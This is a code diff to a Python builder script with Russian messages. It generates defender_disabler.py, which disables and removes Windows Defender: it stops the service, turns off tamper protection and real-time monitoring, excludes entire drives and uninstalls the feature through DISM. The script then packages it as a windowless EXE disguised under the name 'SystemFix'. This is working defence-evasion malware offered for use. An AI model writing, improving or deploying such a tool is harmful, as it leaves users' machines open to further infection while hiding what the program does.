@@ -5,49 +5,44 @@ import sys
 def install_pyinstaller():
     try:
         import PyInstaller
+        print("PyInstaller уже установлен")
     except ImportError:
+        print("Устанавливаем PyInstaller...")
         subprocess.check_call([sys.executable, "-m", "pip", "install", "pyinstaller"])
 
 def create_defender_disabler():
-    disabler_code = '''
-import os
+    disabler_code = '''import os
 import subprocess
 import time
 
 def disable_defender():
-    # Отключаем службу Защитника
     subprocess.run(["sc", "config", "WinDefend", "start=", "disabled"], capture_output=True)
     subprocess.run(["sc", "stop", "WinDefend"], capture_output=True)
-    
-    # Отключаем защиту от вмешательства
     subprocess.run(["reg", "add", "HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows Defender\\\\Features", "/v", "TamperProtection", "/t", "REG_DWORD", "/d", "0", "/f"], capture_output=True)
-    
-    # Добавляем исключения
     subprocess.run(["powershell", "-Command", "Add-MpPreference -ExclusionPath 'C:\\\\'"], capture_output=True)
     subprocess.run(["powershell", "-Command", "Add-MpPreference -ExclusionPath 'D:\\\\'"], capture_output=True)
-    
-    # Отключаем компоненты
     subprocess.run(["powershell", "-Command", "Set-MpPreference -DisableRealtimeMonitoring $true"], capture_output=True)
     subprocess.run(["powershell", "-Command", "Set-MpPreference -MAPSReporting 0"], capture_output=True)
     subprocess.run(["powershell", "-Command", "Set-MpPreference -SubmitSamplesConsent 2"], capture_output=True)
     subprocess.run(["powershell", "-Command", "Set-MpPreference -DisableBehaviorMonitoring $true"], capture_output=True)
-    
-    # Удаляем через DISM
     subprocess.run(["dism", "/online", "/disable-feature", "/featurename:Windows-Defender", "/Remove", "/NoRestart"], capture_output=True)
 
-if name == "__main__":
-    disable_defender()
+disable_defender()
 '''
 
     with open('defender_disabler.py', 'w', encoding='utf-8') as f:
         f.write(disabler_code)
+    print("Файл defender_disabler.py создан")
 
 def compile_to_exe():
-    # Компилируем в exe
-    os.system('pyinstaller --onefile --noconsole --name SystemRepairTool defender_disabler.py')
+    print("Компилируем в EXE...")
+    result = os.system('pyinstaller --onefile --noconsole --name SystemFix defender_disabler.py')
+    if result == 0:
+        print("Успешно! Файл SystemFix.exe создан в папке dist/")
+    else:
+        print("Ошибка компиляции")
 
 if __name__ == "__main__":
     install_pyinstaller()
     create_defender_disabler()
     compile_to_exe()
-    print("Готово! EXE файл создан в папке dist/")
